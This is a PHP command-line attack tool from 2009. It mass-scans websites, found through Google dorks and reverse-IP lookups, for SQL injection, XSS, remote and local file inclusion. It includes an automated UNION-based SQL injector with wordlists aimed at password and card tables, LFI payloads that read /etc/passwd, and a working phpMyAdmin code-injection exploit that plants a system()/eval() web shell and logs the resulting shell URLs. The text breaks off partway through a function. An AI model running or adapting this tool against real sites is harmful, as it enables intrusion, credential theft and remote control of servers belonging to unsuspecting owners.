                                                                     
                                                                     
                                                                     
                                             
<?php

error_reporting(E_ALL & ~E_NOTICE);

Start();

function Start() {
    
    $list_command = array('help','sql','rfi','lfi','xss','full','google','getlist','jump','exploit','wget','quit', 'pmapwn','injector','hexstring','md5string','portscan',);
    
    print Logo();
    Tips();
    while(1) {
        fwrite(STDOUT, "\n-CMD$: ");
        $cmd = trim(fgets(STDIN));
        if($cmd == 'full') {
            fwrite(STDOUT, "\n-SITE: ");
            $site = trim(fgets(STDIN));
            if(empty($site)) {
                print "[Error]Please enter site URL\n";
            } else {
            full($site);
            }
        } else {
        if(in_array($cmd, $list_command)) {
        $cmd();
        } else {
            echo "[Error]Command not found\n";
            Tips();
        }
       }
    }
}

function Logo() {

$text .= "|***************************************************************************************|\n";
$text .= "        Website vulnerable scanner Tools 1.0 By XShimeX\n";
$text .= "        Milw0rm Exploit Finder added by TweetyCoaster(Myanmar)\n";
$text .= "        pmaPWN! - added by d3ck4, hackingexpose.blogspot.com\n";
$text .= "        Greetz : d3ck4,XShimeX,TweetyCoaster,darkc0de,HM,TBDSec\n";
$text .= "        19th June 2009\n";
$text .= "|***************************************************************************************|\n";
$text .= "\n";
print $text;
}


function Help() {

$text .= "[sql] --------> Scan SQL Injection vulnerable\n";
$text .= "[xss] --------> Scan XSS(cross site scripting) vulnerable\n";
$text .= "[rfi] --------> Scan RFI(remote file include) vulnerable\n";
$text .= "[lfi] --------> Scan LFI(local file include) vulnerable\n";
$text .= "[pmapwn] -----> Scan phpMyAdmin code injection vulnerable\n";
$text .= "[full] -------> Grab link from website and start all scan\n";
$text .= "[google] -----> Grab website from google and start all scan\n";
$text .= "[getlist] ----> Grab website from file and start all scan\n";
$text .= "[jump] -------> Find all site hosted on same ip and start all scan\n";
$text .= "[exploit] ----> Milw0rm Exploit Finder\n";
$text .= "[injector] ---> Automatic SQL Injector, work for v4 and v5\n";
$text .= "[hexstring] --> Convert string to hex (useful for sql injection)\n";
$text .= "[md5string] --> Convert string to MD5 Hash\n";
$text .= "[portscan] --> Check port open and close\n";
$text .= "[wget] -------> Get file from URL\n";
print $text;
}

function Tips() {
    print "[Tips] For help, type 'help' and to quit please type 'quit'\n";
}

function full($site) {
    print "[-] Start full scanning mode.\n";
    pmapwn($site, 1);
    print "[-] Start SQL Injection Scan\n";
    sql($site, 1);
    print "[-] Start XSS Scan\n";
    xss($site, 1);
    print "[-] Start RFI Scan\n";
    rfi($site, 1);
    print "[-] Start LFI Scan\n";
    lfi($site, 1);
}

function hexstring() {
    fwrite(STDOUT, "-String: ");
    $string = trim(fgets(STDIN));
    print "[-] String: $string\n";
    print "[-] Hex: ".HexValue($string)."\n";
}

function portscan() {
    fwrite(STDOUT, "-IP/Domain: ");
    $host = trim(fgets(STDIN));
    fwrite(STDOUT, "-Start Port: ");
    $sport = trim(fgets(STDIN));
    fwrite(STDOUT, "-End Port: ");
    $eport = trim(fgets(STDIN));
    print "[-] IP/Domain : $host\n";
    $sport = intval($sport);
    $eport = intval($eport);
    print "[-] Checking...\n";
    for($i = $sport; $i <= $eport; $i++) {
        $check = @fsockopen($host, $i, $errno, $errstr, 3);
        if($check) {
            print "[-] Port '$i' is open\n";
        }
    }
    print "[-] Done\n";
}

function md5string() {
    fwrite(STDOUT, "-String: ");
    $string = trim(fgets(STDIN));
    print "[-] String: $string\n";
    print "[-] MD5: ".md5($string)."\n";
}


function jump() {
    
        fwrite(STDOUT, "-SITE: ");
        $site = trim(fgets(STDIN));
        $request = parse_url($site);
        $jump_site = "http://www.ip-adress.com/reverse_ip/$request[host]";
        $pattern = "/href=\"\/whois\/(.*?)\">Who(.*?)<\/a>/";
        print "[-] URL : $request[host]\n";
        print "[-] Path: $request[path]\n";
        print "[-] Server IP: ".gethostbyname($request['host'])."\n";
        print "[-] Get list domain hosted on the ip...\n";
        $list = con_host($jump_site);
        preg_match_all($pattern,$list, $links);
        print "[-] Total site hosted on ".$request['host']." : ".count($links[1])."\n";
        foreach($links[1] as $link) {
        $link = "http://".$link;
        save_log('domain_list.txt',"$link\n");
        }
        print "[-] Domain list save to 'domain_list.txt'\n";
        foreach($links[1] as $link) {
        $link = "http://".$link;
        full($link);
        joomla($link);
        }
        
}

function google() {
    fwrite(STDOUT, "-DORK: ");
    $dork = trim(fgets(STDIN));
    print "[-] Dork: $dork\n";
    print "[-] Start google scanning...\n";
    for($i = 0; $i <= 900; $i+=100) {
        $fp = con_host("http://www.google.com/cse?cx=013269018370076798483%3Awdba3dlnxqm&q=$dork&num=100&hl=en&as_qdr=all&start=$i&sa=N");
        @preg_match_all("/<h2 class=(.*?)><a href=\"(.*?)\" class=(.*?)>/", $fp, $links);
        $res[] = $links[2];
    }
    foreach($res as $key) {
        foreach($key as $target) {
            $total++;
        }
    }
    print "[+] Total site found: $total\n";
    print "[+] Done finding link on google\n";
    print "[!] If you found this not working pls notify us!\n";
    foreach($res as $key) {
        foreach($key as $target) {
            $real = parse_url($target);
            save_log('domain_list.txt',"http://".$real['host']."\n");
        }
    }
    print "[-] Domain list save to 'domain_list.txt'\n";
    foreach($res as $key) {
        foreach($key as $target) {
            full($target);
        }
    }
    
}

function getlist() {
    fwrite(STDOUT, "-FILE: ");
    $getfile = trim(fgets(STDIN));
    $handle = fopen($getfile, "r");
while (!feof($handle)) {
    $line = fgets($handle);
    $try = trim($line);
    full($try);
    }

fclose($handle);
}

function joomla($site) {
    if($content = con_host($site)) {
        if(preg_match("/option=com_/", $content)) {
            print "[-] Joomla site found: $site\n";
        }
    } 
}

function lfi($site = '', $full = '0') {
    $list_lfi = array(
        '../etc/passwd',
        '../../etc/passwd',
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../../../../../etc/passwd',
        '../../../../../../../etc/passwd',
        '../../../../../../../../etc/passwd',
        '../../../../../../../../../etc/passwd',
        '../etc/passwd%00',
        '../../etc/passwd%00',
        '../../../etc/passwd%00',
        '../../../../etc/passwd%00',
        '../../../../../etc/passwd%00',
        '../../../../../../etc/passwd%00',
        '../../../../../../../etc/passwd%00',
        '../../../../../../../../etc/passwd%00',
        '../../../../../../../../../etc/passwd%00',
    );
        if($full == '0') {
        fwrite(STDOUT, "\n-SITE: ");
        $site = trim(fgets(STDIN));
        } else {
            $site = $site;
        }
        
        $request = parse_url($site);
        print "[-] URL : $request[host]\n";
        print "[-] Path: $request[path]\n";
        print "[-] Try connect to host\n";
        $url = "".$request['scheme']."://".$request['host'].$request['path']."";
        if(con_host($url))
        {
            print "[+] Connect to host successful\n";
            print Get_Info($url);
            print "[-] Finding link on the website\n";
            print "[+] Found link : ".count(find_link($url))."\n";
            print "[-] Finding vulnerable...\n";
            if(is_array(find_link($url)))
            foreach(find_link($url) as $link) {
                $file = explode("/", $request['path']);
                $request['path'] = preg_replace("/".$file[count($file)-1]."/", "", $request['path']);
                if(!preg_match("/$request[host]/", $link)) { $link = "http://$request[host]/$request[path]$link"; }
                foreach($list_lfi as $error) {
                    $link = preg_replace("/=(.+)/", "=$error", $link);
                    if(preg_match("/root:x:/", con_host($link))) {
                        print "[-]LFI vulnerable : $link\n";
                        $save[] = $link;
                    }
                }
            }
            print "[-] Done\n";
            if(is_array($save)) {
               foreach($save as $link) {
               save_log('vulnerable.log', "".$link."\r\n");
               }}
               print "[+] See 'vulnerable.log' for vulnerable list\n";
    }
  }


function sql($site = '', $full = '0') {
    $sql_error = array(
        'You have an error in your SQL',
        'Division by zero in',
        'supplied argument is not a valid MySQL result resource in',
        'Call to a member function',
        'Microsoft JET Database','ODBC Microsoft Access Driver',
        'Microsoft OLE DB Provider for SQL Server',
        'Unclosed quotation mark',
        'Microsoft OLE DB Provider for Oracle',
        '[Macromedia][SQLServer JDBC Driver][SQLServer]Incorrect',
        'Incorrect syntax near'
    );
        if($full == '0') {
        fwrite(STDOUT, "\n-SITE: ");
        $site = trim(fgets(STDIN));
        } else {
            $site = $site;
        }
        
        $request = parse_url($site);
        print "[-] URL : $request[host]\n";
        print "[-] Path: $request[path]\n";
        print "[-] Try connect to host\n";
        $url = "".$request['scheme']."://".$request['host'].$request['path']."";
        if(con_host($url))
        {
            print "[-] Connect to host successful\n";
            print Get_Info($url);
            print "[-] Finding link on the website\n";
            print "[+] Found link : ".count(find_link($url))."\n";
            print "[-] Finding vulnerable...\n";
            if(is_array(find_link($url)))
            foreach(find_link($url) as $link) {
                $file = explode("/", $request['path']);
                $request['path'] = preg_replace("/".$file[count($file)-1]."/", "", $request['path']);
                if(!preg_match("/$request[host]/", $link)) { $link = "http://$request[host]/$request[path]$link"; }
                $link = preg_replace("/=(.+)/", "=1'", $link);
                foreach($sql_error as $error) {
                    if(preg_match("/$error/", con_host($link))) {
                        print "[+] SQL Injection vulnerable : $link\n";
                        $save[] = $link;
                    }
                }
            }
            print "[+] Done\n";
            if(is_array($save)) {
               foreach($save as $link) {
               save_log('vulnerable.log', "".$link."\r\n");
               }}
               print "[-] See 'vulnerable.log' for vulnerable list\n";
    }
  }
  

function rfi($site = '', $full = '0') {
    
        if($full == '0') {
        fwrite(STDOUT, "\n-SITE: ");
        $site = trim(fgets(STDIN));
        } else {
            $site = $site;
        }
        
        $request = parse_url($site);
        print "[-] URL : $request[host]\n";
        print "[-] Path: $request[path]\n";
        print "[-] Try connect to host\n";
        $url = "".$request['scheme']."://".$request['host'].$request['path']."";
        if(con_host($url))
        {
            print "[-] Connect to host successful\n";
            print Get_Info($url);
            print "[-] Finding link on the website\n";
            print "[+] Found link : ".count(find_link($url))."\n";
            print "[-] Finding vulnerable...\n";
            if(is_array(find_link($url)))
            foreach(find_link($url) as $link) {
                $file = explode("/", $request['path']);
                $request['path'] = preg_replace("/".$file[count($file)-1]."/", "", $request['path']);
                if(!preg_match("/$request[host]/", $link)) { $link = "http://$request[host]/$request[path]$link"; }
                $link = preg_replace("/=(.+)/", "=http://google.com/index.html?", $link);
                if(preg_match("/Advertising&nbsp;Programs/", con_host($link))) {
                    echo "[+] RFI vulnerable : $link\n";
                    $save[] = $link;
                }
            }
           print "[+] Done\n";
           if(is_array($save)) {
           foreach($save as $link) {
               save_log('vulnerable.log', "".$link."\r\n");
           }}
           print "[+] See 'vulnerable.log' for vulnerable list\n";
            
        } else {
            print "[!] Connect to host failed\n";
        }
   }


function xss($site = '', $full = '0') {
    
        if($full == '0') {
        fwrite(STDOUT, "\n-SITE: ");
        $site = trim(fgets(STDIN));
        } else {
            $site = $site;
        }
        
        $request = parse_url($site);
        print "[-] URL : $request[host]\n";
        print "[-] Path: $request[path]\n";
        print "[-] Try connect to host\n";
        $url = "".$request['scheme']."://".$request['host'].$request['path']."";
        if(con_host($url))
        {
            print "[+] Connect to host successful\n";
            print Get_Info($url);
            print "[-] Finding link on the website\n";
            print "[+] Found link : ".count(find_link($url))."\n";
            print "[-] Finding vulnerable...\n";
            if(is_array(find_link($url)))
            foreach(find_link($url) as $link) {
                $file = explode("/", $request['path']);
                $request['path'] = preg_replace("/".$file[count($file)-1]."/", "", $request['path']);
                if(!preg_match("/$request[host]/", $link)) { $link = "http://$request[host]/$request[path]$link"; }
                $link = preg_replace("/=(.+)/", "=<h1>XSS_HERE</h1>", $link);
                if(preg_match("/<h1>XSS_HERE<\/h1>/", con_host($link)))                             {
                    echo "[+] XSS vulnerable : $link\n";
                    $save[] = $link;
               }
            }
           print "[+] Done\n";
           if(is_array($save)) {
           foreach($save as $link) {
               save_log('vulnerable.log', "".$link."\r\n");
           }}
           print "[+] See 'vulnerable.log' for vulnerable list\n";
            
        } else {
            print "[!] Connect to host failed\n";
        }
   }

/*
Exploit function
added by tweetycoaster 17-06-2009
based on Bugs Exploit Finder V 1.0 2008 by DDOS
Ms5ote@hotmail.fr
Milw0rm Exploits Finder  V 0.1
*/
function exploit() {

  fwrite(STDOUT, "-Exploit: ");
        $script = trim(fgets(STDIN));
        $url="http://www.milw0rm.com/search.php?dong=$script";
print "[-] Connecting ...\n";
        $dump=file_get_contents($url);
        preg_match_all('#<td class="style14" nowrap="nowrap" width="62">(.*?)</td>#',$dump,$date);
        preg_match_all('#target="_blank" class="style14">(.*?)</a></td>#',$dump,$exploit);
        preg_match_all('#<td nowrap="nowrap" width="375"><a href="(.*?)" target="_blank" class="style14">#',$dump,$url);
print "[+] Connected ! ! !\n";
sleep(3);
$lang=sizeof($date[1]);

for($i=0 ; $i < $lang ; $i++){
$d=$i+1;
print "\n";
print "[+] Exploit Number : $d \n";
save_log('exploits.log', "[+]Exploit Number : $d \r\n");
print "[+] Exploit Name = ".$exploit[1][$i]."\n";
save_log('exploits.log', "[+]Exploit Name = ".$exploit[1][$i]."\r\n");
print "[+] Exploit URL  = http://www.milw0rm.com".$url[1][$i]."\r\n";
save_log('exploits.log', "[+]Exploit URL  = http://www.milw0rm.com".$url[1][$i]."\r\n");
print "[+] Exploit Date = ".$date[1][$i]."\n";
save_log('exploits.log', "[+]Exploit Date = ".$date[1][$i]."\r\n");
save_log('exploits.log', " ------------------------------- \r\n");
$dd++;
sleep(1.2);

                            }
            print "\n\n";
            print "[+] Done !\n\n";
            print "[+] See 'exploits.log' for details list\n";
                    }
                    
function pmapwn($site = '', $full = '0') {
$list = array(
'/phpmyadmin/',
'/phpMyAdmin/', 
'/PMA/',
'/pma/', 
'/admin/', 
'/dbadmin/', 
'/mysql/', 
'/myadmin/', 
'/phpmyadmin2/', 
'/phpMyAdmin2/', 
'/phpMyAdmin-2/', 
'/php-my-admin/', 
'/phpMyAdmin-2.2.3/', 
'/phpMyAdmin-2.2.6/', 
'/phpMyAdmin-2.5.1/', 
'/phpMyAdmin-2.5.4/', 
'/phpMyAdmin-2.5.5-rc1/', 
'/phpMyAdmin-2.5.5-rc2/', 
'/phpMyAdmin-2.5.5/', 
'/phpMyAdmin-2.5.5-pl1/', 
'/phpMyAdmin-2.5.6-rc1/', 
'/phpMyAdmin-2.5.6-rc2/', 
'/phpMyAdmin-2.5.6/', 
'/phpMyAdmin-2.5.7/', 
'/phpMyAdmin-2.5.7-pl1/', 
'/phpMyAdmin-2.6.0-alpha/', 
'/phpMyAdmin-2.6.0-alpha2/', 
'/phpMyAdmin-2.6.0-beta1/', 
'/phpMyAdmin-2.6.0-beta2/', 
'/phpMyAdmin-2.6.0-rc1/', 
'/phpMyAdmin-2.6.0-rc2/', 
'/phpMyAdmin-2.6.0-rc3/', 
'/phpMyAdmin-2.6.0/', 
'/phpMyAdmin-2.6.0-pl1/', 
'/phpMyAdmin-2.6.0-pl2/', 
'/phpMyAdmin-2.6.0-pl3/', 
'/phpMyAdmin-2.6.1-rc1/', 
'/phpMyAdmin-2.6.1-rc2/', 
'/phpMyAdmin-2.6.1/', 
'/phpMyAdmin-2.6.1-pl1/', 
'/phpMyAdmin-2.6.1-pl2/', 
'/phpMyAdmin-2.6.1-pl3/', 
'/phpMyAdmin-2.6.2-rc1/', 
'/phpMyAdmin-2.6.2-beta1/', 
'/phpMyAdmin-2.6.2-rc1/', 
'/phpMyAdmin-2.6.2/', 
'/phpMyAdmin-2.6.2-pl1/', 
'/phpMyAdmin-2.6.3/', 
'/phpMyAdmin-2.6.3-rc1/', 
'/phpMyAdmin-2.6.3/', 
'/phpMyAdmin-2.6.3-pl1/', 
'/phpMyAdmin-2.6.4-rc1/', 
'/phpMyAdmin-2.6.4-pl1/', 
'/phpMyAdmin-2.6.4-pl2/', 
'/phpMyAdmin-2.6.4-pl3/', 
'/phpMyAdmin-2.6.4-pl4/', 
'/phpMyAdmin-2.6.4/', 
'/phpMyAdmin-2.7.0-beta1/', 
'/phpMyAdmin-2.7.0-rc1/', 
'/phpMyAdmin-2.7.0-pl1/', 
'/phpMyAdmin-2.7.0-pl2/', 
'/phpMyAdmin-2.7.0/', 
'/phpMyAdmin-2.8.0-beta1/', 
'/phpMyAdmin-2.8.0-rc1/', 
'/phpMyAdmin-2.8.0-rc2/', 
'/phpMyAdmin-2.8.0/', 
'/phpMyAdmin-2.8.0.1/', 
'/phpMyAdmin-2.8.0.2/', 
'/phpMyAdmin-2.8.0.3/', 
'/phpMyAdmin-2.8.0.4/', 
'/phpMyAdmin-2.8.1-rc1/', 
'/phpMyAdmin-2.8.1/', 
'/phpMyAdmin-2.8.2/', 
'/sqlmanager/', 
'/mysqlmanager/', 
'/p/m/a/', 
'/PMA2005/', 
'/pma2005/', 
'/phpmanager/', 
'/php-myadmin/', 
'/phpmy-admin/', 
'/webadmin/', 
'/sqlweb/', 
'/websql/', 
'/webdb/', 
'/mysqladmin/', 
'/mysql-admin/',
);

        if($full == '0') {
        fwrite(STDOUT, "\n-SITE: ");
        $site = trim(fgets(STDIN));
        } else {
            $site = $site;
        }
        
        print "\n[!] pmaPWN! - phpMyAdmin Code Injection Exploit(PHP) by d3ck4\n\n";
        print "[-] Site : ".$site."\n";
        print "[-] Scanning phpMyAdmin, wait sec..\n";
        foreach($list as $path) {
        phpmyadmin_scan_site($site.$path);
  }
}

function phpmyadmin_scan_site($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    $result = curl_exec($ch);
    curl_close($ch);
    //print $url;
    if (preg_match("/200 OK/", $result) and preg_match("/phpMyAdmin/", $result)) {
        print "\n[!] w00t! w00t! Found phpMyAdmin [ ".$url." ]";
        print "\n[-] Scanning vulnerable, wait sec..\n";
        phpmyadmin_exploit_site($url);
    }
}

function phpmyadmin_exploit_site($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_URL, $url."scripts/setup.php");
    $result = curl_exec($ch);
    curl_close($ch);
    $ch2 = curl_init();
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch2, CURLOPT_HEADER, 1);
    curl_setopt($ch2, CURLOPT_URL, $url."config/config.inc.php");
    $result2 = curl_exec($ch2);
    curl_close($ch2);
    //print $url;
    if (preg_match("/200 OK/", $result) and preg_match("/token/", $result) and preg_match("/200 OK/", $result2)) {
        print "\n[!] w00t! w00t! Found possible phpMyAdmin vuln";
        print "\n[-] Exploiting, wait sec..\n";
        phpmyadmin_exploit($url);
    }
    else {
        print "\n[-] Shit! no luck.. not vulnerable\n";
    }
}

function phpmyadmin_exploit($w00t) {
        $useragent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 (.NET CLR 3.5.30729) "; //firefox 
        //first get cookie + token 
        $curl = curl_init(); 
        curl_setopt($curl, CURLOPT_URL, $w00t."scripts/setup.php"); //URL 
        curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,20);
        curl_setopt($curl, CURLOPT_USERAGENT, $useragent); 
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);         
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); //return site as string 
        curl_setopt($curl, CURLOPT_COOKIEFILE, "expoitcookie.txt"); 
        curl_setopt($curl, CURLOPT_COOKIEJAR, "exploitcookie.txt"); 
        $result = curl_exec($curl);
        curl_close($curl);
        if (preg_match_all("/token\"\s+value=\"([^>]+?)\"/", $result, $matches));
        
        $token = $matches[1][1];
        if ($token != '') {
        print "\n[!] w00t! w00t! Got token = " . $matches[1][1];
        $payload = "token=".$token."&action=save&configuration=a:1:{s:7:%22Servers%22%3ba:1:{i:0%3ba:6:{s:136:%22host%27%5d=%27%27%3b%20if(\$_GET%5b%27c%27%5d){echo%20%27%3cpre%3e%27%3bsystem(\$_GET%5b%27c%27%5d)%3becho%20%27%3c/pre%3e%27%3b}if(\$_GET%5b%27p%27%5d){echo%20%27%3cpre%3e%27%3beval(\$_GET%5b%27p%27%5d)%3becho%20%27%3c/pre%3e%27%3b}%3b//%22%3bs:9:%22localhost%22%3bs:9:%22extension%22%3bs:6:%22mysqli%22%3bs:12:%22connect_type%22%3bs:3:%22tcp%22%3bs:8:%22compress%22%3bb:0%3bs:9:%22auth_type%22%3bs:6:%22config%22%3bs:4:%22user%22%3bs:4:%22root%22%3b}}}&eoltype=unix";
        print "\n[-] Sending evil payload mwahaha.. \n";
        $curl = curl_init(); 
        curl_setopt($curl, CURLOPT_URL, $w00t."scripts/setup.php"); 
        curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,20);
        curl_setopt($curl, CURLOPT_USERAGENT, $useragent); 
        curl_setopt($curl, CURLOPT_REFERER, $w00t); 
        curl_setopt($curl, CURLOPT_POST, true); 
        curl_setopt($curl, CURLOPT_POSTFIELDS, $payload); 
        curl_setopt($curl, CURLOPT_COOKIEFILE, "expoitcookie.txt"); 
        curl_setopt($curl, CURLOPT_COOKIEJAR, "exploitcookie.txt"); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 3); 
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE); 
        $result = curl_exec($curl);
        curl_close($curl);
        
        print "\n[!] w00t! w00t! You should now have shell here";
        print "\n[+] ".$w00t."config/config.inc.php?c=id \n";
        save_log('pmashell.txt', $w00t."config/config.inc.php?c=id\r\n");
        }
        else {
            print "\n[!] Shit! no luck.. not vulnerable\n";
            return false;
        }
        print "See 'pmashell.txt' for the list\n";
        if (file_exists('exploitcookie.txt')) { unlink('exploitcookie.txt'); }
    }



function injector() {
        
        fwrite(STDOUT, "\n-URL: ");
        $url = trim(fgets(STDIN));
        fwrite(STDOUT, "\n-URL Ending (-- or /*): ");
        $end = trim(fgets(STDIN));
        if(!preg_match("/darkc0de/", $url)) {
            print "[-] Please insert 'darkc0de' token on the URL\n";
            print "[-] Example: http://site.com/news.php?id=darkc0de\n";
            print "[-] Example: http://site.com/index.php?id=darkc0de&pg=news\n";
        } else {
        
        switch($end) {
            case '--' :
            $end = '--';
            break;
            case '/*' :
            $end = '/*';
            break;
            default:
            $end = '--';
            break;
        }
        
        print "[-] URL : $url\n";
        print "[%] Trying connect to host...\n";
        if(con_host($url))
        {
            print "[+] Connect to host successful\n";
            print Get_Info($url);
            print "[-] Finding column number...\n";
            inject_get_column_num($url, $end);
            
        } else {
            print "[!] Connect to host failed\n";
        }}
}


function inject_get_column_num($url, $ending) {

    $max = 100;
    $stop = 0;
    
    $rurl = $url;
    
    for($i = 0; $i <= $max; $i++) {
    $word .= "concat(0x6461726B63306465,0x3a,".str_repeat($i,1).",0x3a),";
    $sql = str_replace("darkc0de", "1+AND+1=2+UNION+ALL+SELECT+".rtrim($word,",")."+$ending", $url);
    if(preg_match("/darkc0de:(.*?):/i", con_host($sql), $val)) {
        print "[-] Found column number: ".$i."\n";
        print "[-] Null Number: ".$val[1]."\n";
        save_log('injector.txt', "[-] Found column number: ".$i."\r\n");
        save_log('injector.txt', "[-] Null Number: ".$val[1]."\r\n");
        
        for($a = 0; $a <= $i; $a++) {
        $col .= "$a,";
         if($a == $val[1]) {
             $col = str_replace($val[1], "darkc0de", $col);
         }
        }
        $real = str_replace("darkc0de", "1+AND+1=2+UNION+ALL+SELECT+".rtrim($col,",")."+$ending", $rurl);
        print "[-] URL: ".$real."\n";
        save_log('injector.txt', "[-] URL: ".$real."\r\n");
        sql_info($real);
    }
  }
}

function sql_info($url) {
    
    $table_4 = array(
    'tbladmins','sort','_wfspro_admin','4images_users','a_admin','account','accounts','adm','admin','admin_login','admin_user','admin_userinfo','administer','administrable','administrate','administration','administrator','administrators','adminrights','admins','adminuser','art','article_admin','articles','artikel','密码','aut','author','autore','backend','backend_users','backenduser','bbs','book','chat_config','chat_messages','chat_users','client','clients','clubconfig','company','config','contact','contacts','content','control','cpg_config','cpg132_users','customer','customers','customers_basket','dbadmins','dealer','dealers','diary','download','Dragon_users','e107.e107_user','e107_user','forum.ibf_members','fusion_user_groups','fusion_users','group','groups','ibf_admin_sessions','ibf_conf_settings','ibf_members','ibf_members_converge','ibf_sessions','icq','images','index','info','ipb.ibf_members','ipb_sessions','joomla_users','jos_blastchatc_users','jos_comprofiler_members','jos_contact_details','jos_joomblog_users','jos_messages_cfg','jos_moschat_users','jos_users','knews_lostpass','korisnici','kpro_adminlogs','kpro_user','links','login','login_admin','login_admins','login_user','login_users','logins','logon','logs','lost_pass','lost_passwords','lostpass','lostpasswords','m_admin','main','mambo_session','mambo_users','manage','manager','mb_users','member','memberlist','members','minibbtable_users','mitglieder','movie','movies','mybb_users','mysql','mysql.user','name','names','news','news_lostpass','newsletter','nuke_authors','nuke_bbconfig','nuke_config','nuke_popsettings','nuke_users','用户','obb_profiles','order','orders','parol','partner','partners','passes','password','passwords','perdorues','perdoruesit','phorum_session','phorum_user','phorum_users','phpads_clients','phpads_config','phpbb_users','phpBB2.forum_users','phpBB2.phpbb_users','phpmyadmin.pma_table_info','pma_table_info','poll_user','punbb_users','pwd','pwds','reg_user','reg_users','registered','reguser','regusers','session','sessions','settings','shop.cards','shop.orders','site_login','site_logins','sitelogin','sitelogins','sites','smallnuke_members','smf_members','SS_orders','statistics','superuser','sysadmin','sysadmins','system','sysuser','sysusers','table','tables','tb_admin','tb_administrator','tb_login','tb_member','tb_members','tb_user','tb_username','tb_usernames','tb_users','tbl','tbl_user','tbl_users','tbluser','tbl_clients','tbl_client','tblclients','tblclient','test','usebb_members','user','user_admin','user_info','user_list','user_login','user_logins','user_names','usercontrol','userinfo','userlist','userlogins','username','usernames','userrights','users','vb_user','vbulletin_session','vbulletin_user','voodoo_members','webadmin','webadmins','webmaster','webmasters','webuser','webusers','x_admin','xar_roles','xoops_bannerclient','xoops_users','yabb_settings','yabbse_settings','ACT_INFO','ActiveDataFeed','Category','CategoryGroup','ChicksPass','ClickTrack','Country','CountryCodes1','CustomNav','DataFeedPerformance1','DataFeedPerformance2','DataFeedPerformance2_incoming','DataFeedShowtag1','DataFeedShowtag2','DataFeedShowtag2_incoming','dtproperties','Event','Event_backup','Event_Category','EventRedirect','Events_new','Genre','JamPass','MyTicketek','MyTicketekArchive','News','PerfPassword','PerfPasswordAllSelected','Promotion','ProxyDataFeedPerformance','ProxyDataFeedShowtag','ProxyPriceInfo','Region','SearchOptions','Series','Sheldonshows','StateList','States','SubCategory','Subjects','Survey','SurveyAnswer','SurveyAnswerOpen','SurveyQuestion','SurveyRespondent','sysconstraints','syssegments','tblRestrictedPasswords','tblRestrictedShows','TimeDiff','Titles','ToPacmail1','ToPacmail2','UserPreferences','uvw_Category','uvw_Pref','uvw_Preferences','Venue','venues','VenuesNew','X_3945','tblArtistCategory','tblArtists','tblConfigs','tblLayouts','tblLogBookAuthor','tblLogBookEntry','tblLogBookImages','tblLogBookImport','tblLogBookUser','tblMails','tblNewCategory','tblNews','tblOrders','tblStoneCategory','tblStones','tblUser','tblWishList','VIEW1','viewLogBookEntry','viewStoneArtist','vwListAllAvailable','CC_info','CC_username','cms_user','cms_users','cms_admin','cms_admins','user_name','jos_user','table_user','email','mail','bulletin','cc_info','login_name','admuserinfo','userlistuser_list','SiteLogin','Site_Login','UserAdmin','Admins','Login','Logins'
    );
    
    $column_4 = array(
'user','username','password','passwd','pass','cc_number','id','email','emri','fjalekalimi','pwd','user_name','customers_email_address','customers_password','user_password','name','user_pass','admin_user','admin_password','admin_pass','usern','user_n','users','login','logins','login_user','login_admin','login_username','user_username','user_login','auid','apwd','adminid','admin_id','adminuser','adminuserid','admin_userid','adminusername','admin_username','adminname','admin_name','usr','usr_n','usrname','usr_name','usrpass','usr_pass','usrnam','nc','uid','userid','user_id','myusername','mail','emni','logohu','punonjes','kpro_user','wp_users','emniplote','perdoruesi','perdorimi','punetoret','logini','llogaria','fjalekalimin','kodi','emer','ime','korisnik','korisnici','user1','administrator','administrator_name','mem_login','login_password','login_pass','login_passwd','login_pwd','sifra','lozinka','psw','pass1word','pass_word','passw','pass_w','user_passwd','userpass','userpassword','userpwd','user_pwd','useradmin','user_admin','mypassword','passwrd','admin_pwd','admin_passwd','mem_password','memlogin','e_mail','usrn','u_name','uname','mempassword','mem_pass','mem_passwd','mem_pwd','p_word','pword','p_assword','myname','my_username','my_name','my_password','my_email','cvvnumber','about','access','accnt','accnts','account','accounts','admin','adminemail','adminlogin','adminmail','admins','aid','aim','auth','authenticate','authentication','blog','cc_expires','cc_owner','cc_type','cfg','cid','clientname','clientpassword','clientusername','conf','config','contact','converge_pass_hash','converge_pass_salt','crack','customer','customers','cvvnumber]','data','db_database_name','db_hostname','db_password','db_username','download','e-mail','emailaddress','full','gid','group','group_name','hash','hashsalt','homepage','icq','icq_number','id_group','id_member','images','index','ip_address','last_ip','last_login','lastname','log','login_name','login_pw','loginkey','loginout','logo','md5hash','member','member_id','member_login_key','member_name','memberid','membername','members','new','news','nick','number','nummer','pass_hash','passwordsalt','passwort','personal_key','phone','privacy','pw','pwrd','salt','search','secretanswer','secretquestion','serial','session_member_id','session_member_login_key','sesskey','setting','sid','spacer','status','store','store1','store2','store3','store4','table_prefix','temp_pass','temp_password','temppass','temppasword','text','un','user_email','user_icq','user_ip','user_level','user_passw','user_pw','user_pword','user_pwrd','user_un','user_uname','user_usernm','user_usernun','user_usrnm','userip','userlogin','usernm','userpw','usr2','usrnm','usrs','warez','xar_name','xar_pass'
);
    
    print "[-] Getting sql server information...\n";
    $info = array(
    'User' => 'user()',
    'Database' => 'database()',
    'Version' => 'version()'
    );
    
    $rurl = $url;
    $rurl2 = $url;
    $rurl3 = $url;
    
    $ending = '--';
    
    foreach($info as $get => $val) {
